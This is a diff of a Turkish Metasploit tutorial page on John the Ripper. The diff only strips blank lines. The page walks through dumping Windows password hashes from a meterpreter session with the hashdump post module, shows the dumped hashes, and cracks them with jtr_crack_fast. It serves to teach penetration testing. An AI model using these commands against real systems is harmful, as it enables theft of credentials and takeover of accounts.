@@ -16,23 +16,13 @@ tags:
     - cybersecurity
     - 'metasploit framework'
 ---
-
-
 ## John the Ripper
-
-
 
 John The Ripper programı, karmaşık algoritmalı parolaları çözmek için kullanılan bir programdır. Bir takım kelime listelerini kullanarak hash olarak kaydedilmiş kodları çözmeye çalışır.
 
-
-
 Metasploit içerisinde de John The Ripper kullanabilirsiniz. Burada kullanılacak John the Ripper, basit algoritmalarla ilgilenir. Çok karmaşık ve ileri düzey hash kodları için Metasploit dışında çalışmanız gerektiğini belirtelim. Metasploit içindeki John the Ripper, sadece LM veya NTLM hash kodlarını çözmek için başlangıç düzeyinde işlem yapmanıza yarar. Bir örnekle görelim.
 
-
-
 Öncelikle hedef bilgisayarda meterpreter oturum açtığımızı kabul ediyoruz. `session 1` olarak aktif halde olan oturum için `post/windows/gather/hashdump` modülünü aktif hale getirip hash bilgilerini alalım.
-
-
 ```bash
 msf auxiliary(handler) > use post/windows/gather/hashdump
 msf post(hashdump) > set session 1
@@ -45,24 +35,16 @@ msf post(hashdump) > run
 > Obtaining the user list and keys...
 > Decrypting user keys...
 > Dumping password hashes...
-
-
 Administrator:500:cb5f77772e5178b77b9fbd79429286db:b78fe104983b5c754a27c1784544fda7:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 HelpAssistant:1000:810185b1c0dd86dd756d138f54162df8:7b8f23708aec7107bfdf0925dbb2fed7:::
 SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:8be4bbf2ad7bd7cec4e1cdddcd4b052e:::
 rAWjAW:1003:aad3b435b51404eeaad3b435b51404ee:117a2f6059824c686e7a16a137768a20:::
 rAWjAW2:1004:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
-
-
 > Post module execution completed
 ```
 
-
-
 Hash bilgilerini ekranda görebilirsiniz. Şimdi `auxiliary/analyze/jtr_crack_fast` modülünü kullanalım.
-
-
 ```bash
 msf post(hashdump) > use auxiliary/analyze/jtr_crack_fast
 msf auxiliary(jtr_crack_fast) > run
@@ -105,7 +87,5 @@ guesses: 0  time: 0:00:00:00 DONE (Sat Jul 16 19:59:27 2011)  c/s: 7407K  trying
 > Auxiliary module execution completed
 msf auxiliary(jtr_crack_fast) >
 ```
-
-
 
 Görüldüğü gibi `192.168.184.134` IP adresinde `Guest` kullanıcısı için parola `rAWjAW2` olarak bulundu.
